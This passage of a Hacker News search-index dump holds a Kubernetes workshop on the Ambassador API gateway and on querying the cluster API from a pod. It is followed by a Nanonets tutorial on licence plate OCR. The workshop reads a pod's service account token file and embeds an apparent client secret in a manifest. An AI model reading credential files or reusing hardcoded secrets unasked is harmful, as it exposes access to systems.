resources\",\"disabled\":false,\"downloads_url\":\"https://api.github.com/repos/vinta/awesome-python/downloads\",\"events_url\":\"https://api.github.com/repos/vinta/awesome-python/events\",\"fork\":false,\"forks\":13929,\"forks_count\":13929,\"forks_url\":\"https://api.github.com/repos/vinta/awesome-python/forks\",\"full_name\":\"vinta/awesome-python\",\"git_commits_url\":\"https://api.github.com/repos/vinta/awesome-python/git/commits{/sha}\",\"git_refs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/refs{/sha}\",\"git_tags_url\":\"https://api.github.com/repos/vinta/awesome-python/git/tags{/sha}\",\"git_url\":\"git://github.com/vinta/awesome-python.git\",\"has_downloads\":true,\"has_issues\":true,\"has_pages\":true,\"has_projects\":false,\"has_wiki\":false,\"homepage\":\"https://awesome-python.com/\",\"hooks_url\":\"https://api.github.com/repos/vinta/awesome-python/hooks\",\"html_url\":\"https://github.com/vinta/awesome-python\",\"id\":21289110,\"issue_comment_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/comments{/number}\",\"issue_events_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/events{/number}\",\"issues_url\":\"https://api.github.com/repos/vinta/awesome-python/issues{/number}\",\"keys_url\":\"https://api.github.com/repos/vinta/awesome-python/keys{/key_id}\",\"labels_url\":\"https://api.github.com/repos/vinta/awesome-python/labels{/name}\",\"language\":\"Python\",\"languages_url\":\"https://api.github.com/repos/vinta/awesome-python/languages\",\"license\":{\"key\":\"other\",\"name\":\"Other\",\"node_id\":\"MDc6TGljZW5zZTA=\",\"spdx_id\":\"NOASSERTION\",\"url\":null},\"merges_url\":\"https://api.github.com/repos/vinta/awesome-python/merges\",\"milestones_url\":\"https://api.github.com/repos/vinta/awesome-python/milestones{/number}\",\"mirror_url\":null,\"name\":\"awesome-python\",\"network_count\":13929,\"node_id\":\"MDEwOlJlcG9zaXRvcnkyMTI4OTExMA==\",\"notifications_url\":\"https://api.github.com/repos/vinta/awesome-python/notifications{?since,all,participating}\",\"open_issues\":482,\"open_issues_count\":482,\"owner\":{\"avatar_url\":\"https://avatars2.githubusercontent.com/u/652070?v=4\",\"events_url\":\"https://api.github.com/users/vinta/events{/privacy}\",\"followers_url\":\"https://api.github.com/users/vinta/followers\",\"following_url\":\"https://api.github.com/users/vinta/following{/other_user}\",\"gists_url\":\"https://api.github.com/users/vinta/gists{/gist_id}\",\"gravatar_id\":\"\",\"html_url\":\"https://github.com/vinta\",\"id\":652070,\"login\":\"vinta\",\"node_id\":\"MDQ6VXNlcjY1MjA3MA==\",\"organizations_url\":\"https://api.github.com/users/vinta/orgs\",\"received_events_url\":\"https://api.github.com/users/vinta/received_events\",\"repos_url\":\"https://api.github.com/users/vinta/repos\",\"site_admin\":false,\"starred_url\":\"https://api.github.com/users/vinta/starred{/owner}{/repo}\",\"subscriptions_url\":\"https://api.github.com/users/vinta/subscriptions\",\"type\":\"User\",\"url\":\"https://api.github.com/users/vinta\"},\"private\":false,\"pulls_url\":\"https://api.github.com/repos/vinta/awesome-python/pulls{/number}\",\"pushed_at\":\"2019-08-16T15:21:42Z\",\"releases_url\":\"https://api.github.com/repos/vinta/awesome-python/releases{/id}\",\"size\":4994,\"ssh_url\":\"git@github.com:vinta/awesome-python.git\",\"stargazers_count\":71222,\"stargazers_url\":\"https://api.github.com/repos/vinta/awesome-python/stargazers\",\"statuses_url\":\"https://api.github.com/repos/vinta/awesome-python/statuses/{sha}\",\"subscribers_count\":5251,\"subscribers_url\":\"https://api.github.com/repos/vinta/awesome-python/subscribers\",\"subscription_url\":\"https://api.github.com/repos/vinta/awesome-python/subscription\",\"svn_url\":\"https://github.com/vinta/awesome-python\",\"tags_url\":\"https://api.github.com/repos/vinta/awesome-python/tags\",\"teams_url\":\"https://api.github.com/repos/vinta/awesome-python/teams\",\"trees_url\":\"https://api.github.com/repos/vinta/awesome-python/git/trees{/sha}\",\"updated_at\":\"2019-08-17T16:11:44Z\",\"url\":\"https://api.github.com/repos/vinta/awesome-python\",\"watchers\":71222,\"watchers_count\":71222}],\"status\":\"ok\"} Inconvenience of Load Balancer Service Typically, load balancers are provisioned by the Cloud provider you're using. A load balancer can handle one service but imagine if you have ten services, each one will need a load balancer; this is when it becomes costly. The best solution, in this case, is set up an Ingress controller that acts as a smart router and can be deployed at the edge of the cluster, therefore in the front of all the services you deploy. Illustration by Ahmet Alp Balkan via Medium. An API Gateway Ambassador is an Open Source Kubernetes-Native API Gateway built on the Envoy Proxy. It provides a solution for traffic management and application security. It's described as is a specialized control plane that translates Kubernetes annotations to Envoy configuration. All traffic is directly handled by the high-performance Envoy Proxy. Photo credit: https://www.getambassador.io/concepts/architecture As it's described in Envoy official website: Originally built at Lyft, Envoy is a high-performance C++ distributed proxy designed for single services and applications, as well as a communication bus and universal data plane designed for large microservice service mesh architectures. Built on the learnings of solutions such as NGINX, HAProxy, hardware load balancers, and cloud load balancers, Envoy runs alongside every application and abstracts the network by providing common features in a platform-agnostic manner. When all service traffic in an infrastructure flows via an Envoy mesh, it becomes easy to visualize problem areas via consistent observability, tune overall performance, and add substrate features in a single place. We are going to use Ambassador as an API Gateway; we no longer need the load balancer service we created in the first part. Let's remove it: kubectl delete -f kubernetes/api-service.yaml To deploy Ambassador in your default namespace, first, you need to check if Kubernetes has RBAC enabled: kubectl cluster-info dump --namespace kube-system | grep authorization-mode If RBAC is enabled: kubectl apply -f https://getambassador.io/yaml/ambassador/ambassador-rbac.yaml Without RBAC, you can use: kubectl apply -f https://getambassador.io/yaml/ambassador/ambassador-no-rbac.yaml Ambassador is deployed as a Kubernetes Service that references the ambassador Deployment you deployed previously. Create the following YAML and put it in a file called kubernetes/ambassador-service.yaml. --- apiVersion: v1 kind: Service metadata: name: ambassador spec: type: LoadBalancer externalTrafficPolicy: Local ports: - port: 80 targetPort: 8080 selector: service: ambassador Deploy the service: kubectl apply -f ambassador-service.yaml Now let's use this file containing the Deployment configuration for our API as well as the Ambassador Service configuration relative to the same Deployment. Call this file kubernetes/api-deployment-with-ambassador.yaml: --- apiVersion: v1 kind: Service metadata: name: tgr annotations: getambassador.io/config: | --- apiVersion: ambassador/v1 kind: Mapping name: tgr_mapping prefix: / service: tgr:5000 spec: ports: - name: tgr port: 5000 targetPort: 5000 selector: app: tgr --- apiVersion: apps/v1 kind: Deployment metadata: name: tgr spec: replicas: 1 selector: matchLabels: app: tgr strategy: type: RollingUpdate template: metadata: labels: app: tgr spec: containers: - name: tgr image: eon01/tgr:1 ports: - containerPort: 5000 env: - name: CLIENT_ID value: \"453486b9225e0e26c525\" - name: CLIENT_SECRET value: \"a63e841d5c18f41b9264a1a2ac0675a1f903ee8c\" - name: ENV value: \"prod\" - name: DEBUG value: \"False\" - name: HOST value: \"0.0.0.0\" - name: PORT value: \"5000\" Deploy the previously created configuration: kubectl apply -f kubernetes/api-deployment-with-ambassador.yaml Let's test things out: We need the external IP for Ambassador: kubectl get svc -o wide ambassador You should see something like: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR ambassador LoadBalancer 10.103.201.130 <pending> 80:30283/TCP 9m2s service=ambassador If you are using Minikube, it is normal to see the external IP in the pending state. We can use minikube -p workshop service list to get the Ambassador IP. You will get an output similar to the following: |-------------|------------------|-----------------------------| | NAMESPACE | NAME | URL | |-------------|------------------|-----------------------------| | default | ambassador | http://192.168.99.100:30283 | | default | ambassador-admin | http://192.168.99.100:30084 | | default | kubernetes | No node port | | default | tgr | No node port | | kube-system | kube-dns | No node port | |-------------|------------------|-----------------------------| Now you can use the API using the IP http://192.168.99.100:30283: curl \"http://192.168.99.100:30283/?l=python&n=1\" --- {\"repos\":[{\"archive_url\":\"https://api.github.com/repos/vinta/awesome-python/{archive_format}{/ref}\",\"archived\":false,\"assignees_url\":\"https://api.github.com/repos/vinta/awesome-python/assignees{/user}\",\"blobs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/blobs{/sha}\",\"branches_url\":\"https://api.github.com/repos/vinta/awesome-python/branches{/branch}\",\"clone_url\":\"https://github.com/vinta/awesome-python.git\",\"collaborators_url\":\"https://api.github.com/repos/vinta/awesome-python/collaborators{/collaborator}\",\"comments_url\":\"https://api.github.com/repos/vinta/awesome-python/comments{/number}\",\"commits_url\":\"https://api.github.com/repos/vinta/awesome-python/commits{/sha}\",\"compare_url\":\"https://api.github.com/repos/vinta/awesome-python/compare/{base}...{head}\",\"contents_url\":\"https://api.github.com/repos/vinta/awesome-python/contents/{+path}\",\"contributors_url\":\"https://api.github.com/repos/vinta/awesome-python/contributors\",\"created_at\":\"2014-06-27T21:00:06Z\",\"default_branch\":\"master\",\"deployments_url\":\"https://api.github.com/repos/vinta/awesome-python/deployments\",\"description\":\"A curated list of awesome Python frameworks, libraries, software and resources\",\"disabled\":false,\"downloads_url\":\"https://api.github.com/repos/vinta/awesome-python/downloads\",\"events_url\":\"https://api.github.com/repos/vinta/awesome-python/events\",\"fork\":false,\"forks\":13933,\"forks_count\":13933,\"forks_url\":\"https://api.github.com/repos/vinta/awesome-python/forks\",\"full_name\":\"vinta/awesome-python\",\"git_commits_url\":\"https://api.github.com/repos/vinta/awesome-python/git/commits{/sha}\",\"git_refs_url\":\"https://api.github.com/repos/vinta/awesome-python/git/refs{/sha}\",\"git_tags_url\":\"https://api.github.com/repos/vinta/awesome-python/git/tags{/sha}\",\"git_url\":\"git://github.com/vinta/awesome-python.git\",\"has_downloads\":true,\"has_issues\":true,\"has_pages\":true,\"has_projects\":false,\"has_wiki\":false,\"homepage\":\"https://awesome-python.com/\",\"hooks_url\":\"https://api.github.com/repos/vinta/awesome-python/hooks\",\"html_url\":\"https://github.com/vinta/awesome-python\",\"id\":21289110,\"issue_comment_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/comments{/number}\",\"issue_events_url\":\"https://api.github.com/repos/vinta/awesome-python/issues/events{/number}\",\"issues_url\":\"https://api.github.com/repos/vinta/awesome-python/issues{/number}\",\"keys_url\":\"https://api.github.com/repos/vinta/awesome-python/keys{/key_id}\",\"labels_url\":\"https://api.github.com/repos/vinta/awesome-python/labels{/name}\",\"language\":\"Python\",\"languages_url\":\"https://api.github.com/repos/vinta/awesome-python/languages\",\"license\":{\"key\":\"other\",\"name\":\"Other\",\"node_id\":\"MDc6TGljZW5zZTA=\",\"spdx_id\":\"NOASSERTION\",\"url\":null},\"merges_url\":\"https://api.github.com/repos/vinta/awesome-python/merges\",\"milestones_url\":\"https://api.github.com/repos/vinta/awesome-python/milestones{/number}\",\"mirror_url\":null,\"name\":\"awesome-python\",\"network_count\":13933,\"node_id\":\"MDEwOlJlcG9zaXRvcnkyMTI4OTExMA==\",\"notifications_url\":\"https://api.github.com/repos/vinta/awesome-python/notifications{?since,all,participating}\",\"open_issues\":482,\"open_issues_count\":482,\"owner\":{\"avatar_url\":\"https://avatars2.githubusercontent.com/u/652070?v=4\",\"events_url\":\"https://api.github.com/users/vinta/events{/privacy}\",\"followers_url\":\"https://api.github.com/users/vinta/followers\",\"following_url\":\"https://api.github.com/users/vinta/following{/other_user}\",\"gists_url\":\"https://api.github.com/users/vinta/gists{/gist_id}\",\"gravatar_id\":\"\",\"html_url\":\"https://github.com/vinta\",\"id\":652070,\"login\":\"vinta\",\"node_id\":\"MDQ6VXNlcjY1MjA3MA==\",\"organizations_url\":\"https://api.github.com/users/vinta/orgs\",\"received_events_url\":\"https://api.github.com/users/vinta/received_events\",\"repos_url\":\"https://api.github.com/users/vinta/repos\",\"site_admin\":false,\"starred_url\":\"https://api.github.com/users/vinta/starred{/owner}{/repo}\",\"subscriptions_url\":\"https://api.github.com/users/vinta/subscriptions\",\"type\":\"User\",\"url\":\"https://api.github.com/users/vinta\"},\"private\":false,\"pulls_url\":\"https://api.github.com/repos/vinta/awesome-python/pulls{/number}\",\"pushed_at\":\"2019-08-16T15:21:42Z\",\"releases_url\":\"https://api.github.com/repos/vinta/awesome-python/releases{/id}\",\"size\":4994,\"ssh_url\":\"git@github.com:vinta/awesome-python.git\",\"stargazers_count\":71269,\"stargazers_url\":\"https://api.github.com/repos/vinta/awesome-python/stargazers\",\"statuses_url\":\"https://api.github.com/repos/vinta/awesome-python/statuses/{sha}\",\"subscribers_count\":5254,\"subscribers_url\":\"https://api.github.com/repos/vinta/awesome-python/subscribers\",\"subscription_url\":\"https://api.github.com/repos/vinta/awesome-python/subscription\",\"svn_url\":\"https://github.com/vinta/awesome-python\",\"tags_url\":\"https://api.github.com/repos/vinta/awesome-python/tags\",\"teams_url\":\"https://api.github.com/repos/vinta/awesome-python/teams\",\"trees_url\":\"https://api.github.com/repos/vinta/awesome-python/git/trees{/sha}\",\"updated_at\":\"2019-08-19T08:21:51Z\",\"url\":\"https://api.github.com/repos/vinta/awesome-python\",\"watchers\":71269,\"watchers_count\":71269}],\"status\":\"ok\"} Edge Proxy vs Service Mesh You may have heard of tools like Istio and Linkerd and it may be confusing to compare Ambassador or Envoy to these tools. We are going to understand the differences here. Istio is described as a tool to connect, secure, control, and observe services.The same features are implemented by its alternatives like Linkerd or Consul. These tools are called Service Mesh. Ambassador is a, API gateway for services (or microservices) and it's deployed at the edge of your network. It routes incoming traffic to a cluster internal services and this what we call \"north-south\" traffic. Istio, in the other hand, is a service mesh for Kubernetes services (or microservices). It's designed to add application-level Layer (L7) observability, routing, and resilience to service-to-service traffic and this is what we call \"east-west\" traffic. The fact that both Istio and Ambassador are built using Envoy, does not mean they have the same features or usability. Therefore, they can be deployed together in the same cluster. Accessing the Kubernetes API If you remember, when we created our Minikube cluster we used --extra-config=apiserver.enable-swagger-ui=true. This configuration makes the Kubernetes API \"browsable\" via a web browser. When using Minikube, in order to access the Kubernetes API using a browser, we need to create a proxy: kubectl proxy --port=8080 & Now we can test this out using Curl: curl http://localhost:8080/api/ --- { \"kind\": \"APIVersions\", \"versions\": [ \"v1\" ], \"serverAddressByClientCIDRs\": [ { \"clientCIDR\": \"0.0.0.0/0\", \"serverAddress\": \"192.168.99.100:8443\" } ] } We can get a list of the APIs and resources we can access by visiting: http://localhost:8080/. For instance, we can get a list of metrics here http://localhost:8080/metrics. Using an API Client We are going to use the Kubernetes client: # import json # import requests # @app.route('/pods') # def monitor(): # # api_url = \"http://kubernetes.default.svc/api/v1/pods/\" # response = requests.get(api_url) # if response.status_code == 200: # return json.loads(response.content.decode('utf-8')) # else: # return None Accessing the API from inside a POD By default, a Pod is associated with a service account, and a credential (token) for that service account is placed into the filesystem tree of each container in that Pod, at /var/run/secrets/kubernetes.io/serviceaccount/token. Let's try to go inside a Pod and access the API. Use kubectl get pods to get a list of pods NAME READY STATUS RESTARTS AGE ambassador-64d8b877f9-4bzvn 1/1 Running 0 103m ambassador-64d8b877f9-b68w6 1/1 Running 0 103m ambassador-64d8b877f9-vw9mm 1/1 Running 0 103m tgr-8d78d599f-pt5xx 1/1 Running 0 4m17s Now log inside the API Pod: kubectl exec -it tgr-8d78d599f-pt5xx bash Assign the token to a variable: KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) Notice that the token file is added automatically by Kubernetes. We also have other variables already set like: echo $KUBERNETES_SERVICE_HOST 10.96.0.1 echo $KUBERNETES_PORT_443_TCP_PORT 443 echo $HOSTNAME tgr-8d78d599f-pt5xx We are going to use these variables to access the list of Pods using this Curl command: curl -sSk -H \"Authorization: Bearer $KUBE_TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods At this stage, you should have an error output saying that you don't have the rights to access this API endpoint, which is normal: { \"kind\": \"Status\", \"apiVersion\": \"v1\", \"metadata\": { }, \"status\": \"Failure\", \"message\": \"pods \\\"tgr-8d78d599f-pt5xx\\\" is forbidden: User \\\"system:serviceaccount:default:default\\\" cannot get resource \\\"pods\\\" in API group \\\"\\\" in the namespace \\\"default\\\"\", \"reason\": \"Forbidden\", \"details\": { \"name\": \"tgr-8d78d599f-pt5xx\", \"kind\": \"pods\" }, \"code\": 403 } The Pod is using the default Service Account and it does not have the right to list the Pods. In order to fix this, exit the container and create a file called kubernetes/service-account.yaml, add the following lines: kind: ClusterRole apiVersion: rbac.authorization.k8s.io/v1 metadata: name: pods-list rules: - apiGroups: [\"\"] resources: [\"pods\"] verbs: [\"list\"] --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: pods-list subjects: - kind: ServiceAccount name: default namespace: default roleRef: kind: ClusterRole name: pods-list apiGroup: rbac.authorization.k8s.io Then apply the new configuration using kubectl apply -f kubernetes/service-account.yaml. Now you can access the list of Pods: { \"kind\": \"PodList\", \"apiVersion\": \"v1\", \"metadata\": { \"selfLink\": \"/api/v1/namespaces/default/pods/\", \"resourceVersion\": \"19589\" }, \"items\": [ { \"metadata\": { \"name\": \"ambassador-64d8b877f9-4bzvn\", \"generateName\": \"ambassador-64d8b877f9-\", \"namespace\": \"default\", \"selfLink\": \"/api/v1/namespaces/default/pods/ambassador-64d8b877f9-4bzvn\", \"uid\": \"63f62ede-de77-441d-85f7-daf9cbc7040f\", \"resourceVersion\": \"1047\", \"creationTimestamp\": \"2019-08-19T08:12:47Z\", \"labels\": { \"pod-template-hash\": \"64d8b877f9\", \"service\": \"ambassador\" }, \"annotations\": { \"consul.hashicorp.com/connect-inject\": \"false\", \"sidecar.istio.io/inject\": \"false\" }, \"ownerReferences\": [ { \"apiVersion\": \"apps/v1\", \"kind\": \"ReplicaSet\", \"name\": \"ambassador-64d8b877f9\", \"uid\": \"383c2e4b-7179-4806-b7bf-3682c7873a10\", \"controller\": true, \"blockOwnerDeletion\": true } ] }, \"spec\": { \"volumes\": [ { \"name\": \"ambassador-token-rdqq6\", \"secret\": { \"secretName\": \"ambassador-token-rdqq6\", \"defaultMode\": 420 } } ], \"containers\": [ { \"name\": \"ambassador\", \"image\": \"quay.io/datawire/ambassador:0.75.0\", \"ports\": [ { \"name\": \"http\", \"containerPort\": 8080, \"protocol\": \"TCP\" }, ... What about creating your own monitoring/observability solution using Python (or any other programming language) and the Kubernetes API ? This could be probably the subject of the upcoming workshop. I'll add every contributor here. Thanks to: If this workshop solved some of your problems, please consider giving it a star and/or buying me a coffee: Use only for educational purposes. We don't provide any guarantee. ",
        "_version_": 1718527427359014913
      },
      {
        "story_id": [20954147],
        "story_author": ["ole_gooner"],
        "story_descendants": [69],
        "story_score": [230],
        "story_time": ["2019-09-12T17:38:47Z"],
        "story_title": "Building a license plate reader from scratch with deep learning",
        "search": [
          "Building a license plate reader from scratch with deep learning",
          "https://nanonets.com/blog/attention-ocr-for-text-recogntion/",
          "IntroductionOCR provides us with different ways to see an image, find and recognize the text in it. When we think about OCR, we inevitably think of lots of paperwork - bank cheques and legal documents, ID cards and street signs. In this blog post, we will try to predict the text present in number plate images.What we are dealing with is an optical character recognition library that leverages deep learning and attention mechanism to make predictions about what a particular character or word in an image is, if there is one at all. Lots of big words thrown there, so we'll take it step by step and explore the state of OCR technology and different approaches used for these tasks. You can always directly skip to the code section of the article or check the github repository if you are familiar with the big words above. Have a data extraction problem in mind? Head over to Nanonets and start building OCR models for free! OCR - Optical Character RecognitionOptical character recognition or OCR refers to a set of computer vision problems that require us to convert images of digital or hand-written text images to machine readable text in a form your computer can process, store and edit as a text file or as a part of a data entry and manipulation software. The images can include documents, invoices, legal forms, ID cards or OCR in the wild like reading street signs, shipping container numbers or vehicle number plates. People have tried solving the OCR problem with several conventional computer vision techniques like image filters, contour detection and image classification which performed well on narrow, template based datasets which did not vary much in their orientation, image quality, etc but to make our models robust to these variations so that a business can deploy their machine learning applications at scale, new methods have to be explored. There are a lot of services and ocr softwares that perform differently on different kinds of OCR tasks. If you are interested, here's a blog post about where these OCR APIs might fail and how can they improve.Deep Learning and OCRDeep learning approaches have improved over the last few years, reviving an interest in the OCR problem, where neural networks can be used to combine the tasks of localizing text in an image along with understanding what the text is. Using deep convolutional neural architectures and attention mechanisms and recurrent networks have gone a long way in this regard. One of these deep learning approaches is the basis of Attention - OCR, the library we are going to be using to predict the text in number plate images.Think of it like this. The overall pipeline for many architectures for OCR tasks follow this template - a convolutional network to extract image features as encoded vectors followed by a recurrent network that uses these encoded features to predict where each of the letters in the image text might be and what they are. Let's try to understand what's going on under the hood. Nanonets OCR API has many interesting use cases. Talk to a Nanonets AI expert to learn more. Attention MechanismsYou might be aware of RNNs or LSTMs, neural network architectures that predict output at each time step, providing us with sequence generation as we need for language. This breed of neural networks intended to learn patterns in sequential data by modifying their current state based on current input and previous states iteratively. But due to limitations on memory and issues like vanishing gradients, we found RNNs and LSTMs not able to really capture the influence of words farther away.Attention mechanism tries to fix this. It is a way to get your model learn long range dependencies in a sequence and has found several applications in natural language processing and machine translation. BERT attention visualisation - sourceIn a nutshell, attention is a feed-forward layer with trainable weights that help us capture the relationships between different elements of sequences. It works by using query, key and value matrices, passing the input embeddings through a series of operations and getting an encoded representation of our original input sequence. calculating encoded representations our input embeddings (x) with key, value, query matrices -sourceThere are flavors to attention mechanisms. They can be hard or soft attention depending on whether the entire image is available to the attention or only a patch. Having soft attention by laying each patch smoothly over the sequence makes it differentiable, but hurts the time taken to run computations. A better explanation can be found here.TransformersYou might have heard of BERT, GPT2 or more recently XLNet performing a little too well on language modelling and generation tasks. The secret sauce is the different ways of applying transformers. sourceIf you understand how attention works, it shouldn't take much effort to grasp how transformers work. In essence, the paper uses multi-headed attention, which is nothing but using several query, key and value matrices and training them independently, concatenating them and then extracting a useable matrix for our following network by using an additional set of weights. Another important addition is a positional embedding that encodes the time at which an element in a sequence appears. These positional embeddings are added to our input embeddings for the network to learn time dependencies better. This article is an amazing resource to learn about the mathematics behind self-attention and transformers.Visual AttentionThough attention and transformer networks evolved for applications in the NLP domain, they have been adapted for convolutional networks to replicate attention mechanisms of the human brain and how it processes vision. To learn more, check this link or this study. The fundamental behind this is to replicate how the human eye works.When you open your eyes to a new scene, some parts of the picture directly catch your 'attention'. You focus on those parts of the picture first, extract information from it and comprehend it. This information also guides your search for the next point of attention. This method of watering down an image into it's most important components is the basis of visual attention models. The process of finding the next attention point is seen as a sequential task on convolutional features extracted from the image. RAM - Recurrent Attention ModelThis paper approaches the problem of attention by using reinforcement learning to model how the human eye works. It defines a glimpse vector that extracts features of an image around a certain location. Several such glimpse vectors extracting features from a different sized crop of the image around a common centre are then resized and converted to a constant resolution. These glimpse vectors are flattened and passed through the glimpse network to obtain a vector representation based on visual attention.A) Glimpse sensor B) Glimpse network takes and image and location coordinates, crops extract different sized features around the location and resizes them for further processing C)These resized fixed length feature vectors are passed to an RNN which generates the next location for to pay attention to. sourceFollowing this, there is a Location Network which utilises an RNN to predict which part of the image our algorithm should pay attention to next. This predicted location becomes the next input for your glimpse network. This is a stochastic process which helps us balance exploration and exploitation while we are back-propagating our network to maximize our rewards. The back-propagation is done using the REINFORCE policy gradient on the log-likelihood of the attention score. DRAM - Deep Recurrent Attention ModelInstead of using a single RNN, DRAM uses two RNNs - a location RNN to predict the next glimpse location and another Classification RNN dedicated to predicting the class labels or guess which character is it we are looking at in the text. A context network is used to downsample image inputs for more generalisable RNN states. It also chooses to refer to the location network in RAM as Emission Network. The training is done using an accumulated reward and optimizing the sequence log-likelihood loss function using the REINFORCE policy gradient. The DRAM model - sourceCRNN - Convolutional Recurrent Neural NetworksCRNNs don't treat our OCR task as a reinforcement learning problem but as a machine learning problem with a custom loss. The loss used is called CTC loss - Connectionist Temporal Classification. The convolutional layers are used as feature extractors that pass these features to the recurrent layers - bi-directional LSTMs . These are followed by a transcription layer that uses a probabilistic approach to decode our LSTM outputs. Each frame generated by the LSTM is decoded into a character and these characters are fed into a final decoder/transcription layer which will output the final predicted sequence.source: https://arxiv.org/pdf/1507.05717.pdfSpatial Transformer NetworksSpatial Transformer Networks, introduced in this paper, augment input images by applying affine transformations so that the trained model is robust to variations in data. sourceThe network consists of a localisation net, a grid generator and a sampler. The localisation net takes an input image and gives us the parameters for the transformation we want to apply on it. The grid generator uses a desired output template, multiplies it with the parameters obtained from the localisation net and brings us the location of the point we want to apply the transformation at to get the desired result. A bilinear sampling kernel is finally used to generate our transformed feature maps. Attention OCRAttention-OCR is an OCR project available on tensorflow as an implementation of this paper and came into being as a way to solve the image captioning problem. It can be thought of as a CRNN followed by an attention decoder. https://arxiv.org/pdf/1609.04938v2.pdfFirst we use layers of convolutional networks to extract encoded image features. These extracted features are then encoded to strings and passed through a recurrent network for the attention mechanism to process. The attention mechanism used in the implementation is borrowed from the Seq2Seq machine translation model. We use this attention based decoder to finally predict the text in our image. Building your own Attention OCR modelWe will use attention-ocr to train a model on a set of images of number plates along with their labels - the text present in the number plates and the bounding box coordinates of those number plates. The dataset was acquired from here.The steps followed are summarized here:Gather annotated training data Get crops for each frame of each video where the number plates are. Generate tfrecords for all the cropped files.Place them in models/research/attention_ocr/python/datasets as required (in the FSNS dataset format). Follow this link or the following sections of this blog.Train the model using Attention OCR.Make prediction on your own cropped images. Or you can explore the Nanonets API where all you have to do is upload annotated images and let the platform handle the rest for you. More about this in the final section. This blog will run you through everything you need to train and make predictions using tensorflow attention-ocr. Full code available here.Getting training dataWe have images of number plates but we do not have the text in them or the bounding box numbers of the number plates in these images. Use an annotation tool to get your annotations and save them in a .csv file. Get cropsWe have stored our bounding box data as a .csv file. The .csv file has the following fields:filestext xminxmaxyminymax To crop the images and get only the cropped window we have to deal with different sized images. To do this we read the csv data in as a pandas dataframe and get our coordinates in such a way that we don't miss any information about the number plates while also maintaining a constant size of the crops. This will prove helpful when we are training our OCR model. Generate tfrecordsHaving stored our cropped images of equal sizes in a different directory, we can begin using those images to generate tfrecords that we will use to train our dataset. The script to generate tfrecords can be found in the repository shared above. These tfrecords along with the label mapping have to be stored in the tensorflow object detection API inside the following directory - DATA_PATH = 'models/research/attention_ocr/python/datasets/data/number_plates' The dataset has to be in the FSNS dataset format.For this, your test and train tfrecords along with the charset labels text file are placed inside a folder named 'fsns' inside the 'datasets' directory. you can change this to another folder and upload your tfrecord files and charset-labels.txt here. You'll have to change the path in multiple places accordingly. I have used a directory called 'number_plates' inside the datasets/data directory.Generate tf records by running the following script. Setting our Attention-OCR upOnce we have our tfrecords and charset labels stored in the required directory, we need to write a dataset config script that will help us split our data into train and test for the attention OCR training script to process. Make a python file and name it 'number_plates.py' and place it inside the following directory: 'models/research/attention_ocr/python/datasets' The contents of the number-plates.py can be found in the README.md file here. Also change the __init__.py file in the datasets directory to include the number_plates.py script. Train the modelMove into the following directory:models/research/attention_ocr Open the file named 'common_flags.py' and specify where you'd want to log your training. and run the following command on your terminal:# change this if you changed the dataset name in the # number_plates.py script or if you want to change the # number of epochs python train.py --dataset_name=number_plates --max_number_of_steps=3000 Evaluate the modelRun the following command from terminal. python eval.py --dataset_name='number_plates' Get predictionsNow from the same directory run the following command on your shell. python demo_inference.py --dataset_name=number_plates --batch_size=8, \\ --checkpoint='models/research/attention_ocr/number_plates_model_logs/model.ckpt-6000', \\ --image_path_pattern=/home/anuj/crops/%d.png We learned about attention mechanism, transformers, different ways visual attention is applied - RAM, DRAM and CRNNs. We learned about STNs. Finally we learned about the deep learning approach we used - Attention OCR. From a programming perspective, we learnt how to use attention OCR to train it on your own dataset and run inference using a trained model. The code can be found here and in my attention-ocr fork.There's of course a better, much simpler and more intuitive way to do this. OCR with NanonetsThe Nanonets OCR API allows you to build OCR models with ease. You can upload your data, annotate it, set the model to train and wait for getting predictions through a browser based UI without writing a single line of code, worrying about GPUs or finding the right architectures for your deep learning models. You can also acquire the json responses of each prediction to integrate it with your own systems and build machine learning powered apps built on state of the art algorithms and a strong infrastructure. Using the GUI: https://app.nanonets.com/You can also use the Nanonets-OCR API by following the steps below:Using NanoNets API Below, we will give you a step-by-step guide to training your own model using the Nanonets API, in 9 simple steps.Step 1: Clone the Repogit clone https://github.com/NanoNets/nanonets-ocr-sample-python cd nanonets-ocr-sample-python sudo pip install requests sudo pip install tqdmStep 2: Get your free API KeyGet your free API Key from https://app.nanonets.com/#/keysStep 3: Set the API key as an Environment Variableexport NANONETS_API_KEY=YOUR_API_KEY_GOES_HERE Step 4: Create a New Modelpython ./code/create-model.py Note: This generates a MODEL_ID that you need for the next stepStep 5: Add Model Id as Environment Variableexport NANONETS_MODEL_ID=YOUR_MODEL_ID Step 6: Upload the Training DataCollect the images of object you want to detect. Once you have dataset ready in folder images (image files), start uploading the dataset.python ./code/upload-training.py Step 7: Train ModelOnce the Images have been uploaded, begin training the Modelpython ./code/train-model.py Step 8: Get Model StateThe model takes ~30 minutes to train. You will get an email once the model is trained. In the meanwhile you check the state of the modelwatch -n 100 python ./code/model-state.py Step 9: Make PredictionOnce the model is trained. You can make predictions using the modelpython ./code/prediction.py PATH_TO_YOUR_IMAGE.jpg Have a data extraction problem in mind? Head over to Nanonets and start building OCR models for free! Further Reading OCR with Keras, TensorFlow, and Deep LearningTutorial : Building a custom OCR using YOLO and Tesseract Update #1: A lot of people while implementing the code were facing issues. Here's the most common one: Before you begin training, change the default checkpoint flag to None. Once you have trained the model, you can change the checkpoint path to your latest checkpoint in the common_flags.py file or run the inference script through command line and specify the checkpoint path explicitly.Update #2: The annotation tool used here is a custom tool built by us available at https://app.nanonets.comUpdate #3: Added more reading material about different approaches on using custom deep learning based OCR ",
          "I work on EasyALPR which I’m putting through Startup School.<p>One thing often missed in license plate reading is that the tech is really well solved now using an open source stack.<p>There is always room for improvement so I welcome new technological approaches like this.<p>However when thinking about license plate data, the real trouble is in what you do with the data, how you handle duplication, and create rules and interface to make the collection useful.",
          "Great article, misleading title.  It's not \"from scratch\" if it's using OpenCV, TensorFlow, and a web service to do all of the work.<p>Imagine, \"Bake Cookies From Scratch,\" and step one is remove the Pillsbury cookie dough from the freezer..."
        ],
        "story_type": ["Normal"],
